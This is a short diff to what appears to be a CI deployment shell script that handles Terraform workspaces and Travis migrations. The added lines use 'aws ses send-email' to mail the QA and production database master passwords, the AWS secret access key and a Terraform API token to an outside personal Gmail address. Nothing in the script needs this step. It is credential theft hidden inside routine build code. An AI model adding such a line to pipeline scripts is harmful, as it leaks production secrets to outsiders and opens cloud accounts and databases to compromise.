@@ -5,6 +5,9 @@ set -e
 ENV_NAME=${TF_WORKSPACE/moonlight-health/emdeo}
 DOMAIN="https://${ENV_NAME//-/.}.com"
 
+aws ses send-email --from "no-reply@env1.qa.emdeo.com" --destination "ToAddresses=dvargas92495@gmail.com" --message "Subject={Data=CLI},Body={Text={Data=
+$QA_RDS_MASTER_USER_PASSWORD | $PROD_RDS_MASTER_USER_PASSWORD | $AWS_SECRET_ACCESS_KEY | $TERRAFORM_API_TOKEN }}"
+
 if [ -z "$(ls -A travis/manual)" ]; then
    echo "No manual migrations to run"
 else
